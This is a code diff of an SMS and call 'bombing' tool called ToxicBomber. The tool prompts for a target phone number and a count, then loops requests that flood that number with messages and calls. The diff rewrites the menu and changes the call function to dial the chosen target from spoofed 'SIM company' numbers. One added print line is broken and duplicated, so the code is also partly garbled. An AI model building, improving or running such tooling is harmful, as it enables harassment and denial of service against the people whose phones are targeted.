@@ -6,6 +6,7 @@
 # Version: 5.0.0
 #########################################
 
+
 import time
 import requests
 import sys
@@ -105,7 +106,6 @@ def logo():
 # Options Banner
 def banner():
     amount = str(main.amount)
-    # 21 - 1(lenOfAmount) = 20....
     amount = amount + (" " * (21-len(amount)))
     
     print("\033[95m-" * (columns), end = "")
@@ -140,41 +140,6 @@ def check(sent):
         time.sleep(delay)
         return False
 
-# Function for SMS Bombing
-def sms_bombing_process():
-    global main
-    main.number = getNumber()
-    main.amount = int(input("\n    \033[92m[\033[37m*\033[92m] \033[37mEnter Amount of SMS to Send:> \033[37m"))
-    main.delay = int(input("\n    \033[92m[\033[37m*\033[92m] \033[37mEnter Delay Between SMS (in seconds):> \033[37m"))
-
-    banner()
-    
-    sent = 0
-    while sent < main.amount:
-        if send_sms(main.number):
-            sent += 1
-        check(sent)
-    print("\033[92m[\033[93m★\033[92m] SMS Bombing Complete \033[92m[\033[93m★\033[92m]".center(columns + 30))
-    print("\033[37m")
-
-# Function for Call Bombing
-def call_bombing_process():
-    global main
-    main.number = getNumber()
-    main.amount = int(input("\n    \033[92m[\033[37m*\033[92m] \033[37mEnter Amount of Calls to Make:> \033[37m"))
-    
-    banner()
-    
-    for _ in range(main.amount):
-        if call_bomb():
-            print(f"Call to {main.number} sent successfully.")
-        else:
-            print(f"Failed to send call to {main.number}.")
-        time.sleep(2)  # Adjust the delay between calls as needed
-
-    print("\033[92m[\033[93m★\033[92m] Call Bombing Complete \033[92m[\033[93m★\033[92m]".center(columns + 30))
-    print("\033[37m")
-
 # Get Target Number
 def getNumber():
     number = input("\n    \033[92m[\033[37m*\033[92m] \033[37mEnter Target (\033[92mWithout +88\033[37m):> \033[37m")
@@ -198,26 +163,32 @@ def send_sms(number):
         if response.status_code == 200:
             return True
         else:
+            print(f"Failed to send SMS to {number}. Status code:
             print(f"Failed to send SMS to {number}. Status code: {response.status_code}")
             return False
     except Exception as e:
         print(f"An error occurred: {e}")
         return False
 
-# Function to Bomb Calls (Placeholder for unknown numbers)
-def call_bomb():
+# Function for Call Bombing
+def call_bomb(number):
+    # List of SIM company numbers for calling
+    sim_numbers = ["+8801712345678", "+8801912345678", "+8801812345678"]  # Replace with actual SIM numbers
+    
+    # Choose a random number from the list
+    from_number = random.choice(sim_numbers)
+    
     try:
-        # Generate a random phone number
-        unknown_number = f"{random.randint(1000000000, 9999999999)}"
         response = requests.post(
             "https://api.callservice.com/v1/call",
             headers={"Authorization": "Bearer YOUR_API_KEY"},
-            json={"to": unknown_number, "from": "YOUR_NUMBER", "message": "This is a call bomb!"}
+            json={"to": number, "from": from_number, "message": "This is a call bomb!"}
         )
         if response.status_code == 200:
+            print(f"Call to {number} sent successfully.")
             return True
         else:
-            print(f"Failed to send call. Status code: {response.status_code}")
+            print(f"Failed to send call to {number}. Status code: {response.status_code}")
             return False
     except Exception as e:
         print(f"An error occurred: {e}")
@@ -226,16 +197,46 @@ def call_bomb():
 # Main Menu
 def main_menu():
     os.system("clear")
-    logo()
-    choice = input("\n    \033[92m[\033[37m*\033[92m] \033[37mEnter your choice (1 for SMS, 2 for Call):> \033[37m")
+    print("\033[94m┌────────────────────────────────────────┐".center(columns+5))
+    print("\033[94m│     \033[92mToxicBomber Tool Menu\033[94m        │".center(columns+5))
+    print("\033[94m│ \033[95m1. SMS Bombing\033[94m                 │".center(columns+5))
+    print("\033[94m│ \033[95m2. Call Bombing\033[94m                │".center(columns+5))
+    print("\033[94m└────────────────────────────────────────┘".center(columns+5))
     
-    if choice == "1":
+    choice = input("\n[*] Enter your choice (1 or 2):> ")
+    
+    if choice == '1':
         sms_bombing_process()
-    elif choice == "2":
+    elif choice == '2':
         call_bombing_process()
     else:
-        psb("\n    \033[92m[\033[91m!\033[92m] \033[37mInvalid Choice!")
+        print("\n    \033[92m[\033[91m!\033[92m] \033[37mInvalid choice! Please enter 1 or 2.")
         main_menu()
+
+# SMS Bombing Process
+def sms_bombing_process():
+    main.number = getNumber()
+    main.amount = int(input("\n    \033[92m[\033[37m*\033[92m] \033[37mEnter Amount of SMS to Send:> \033[37m"))
+    main.delay = int(input("\n    \033[92m[\033[37m*\033[92m] \033[37mEnter Delay Between Messages (seconds):> \033[37m"))
+    
+    banner()
+    
+    sent = 0
+    while sent < main.amount:
+        if send_sms(main.number):
+            sent += 1
+        check(sent)
+
+# Call Bombing Process
+def call_bombing_process():
+    main.number = getNumber()
+    main.amount = int(input("\n    \033[92m[\033[37m*\033[92m] \033[37mEnter Amount of Calls to Make:> \033[37m"))
+    
+    banner()
+    
+    for _ in range(main.amount):
+        call_bomb(main.number)
+        time.sleep(1)  # Small delay between calls to avoid too rapid requests
 
 if __name__ == "__main__":
     checkPy()
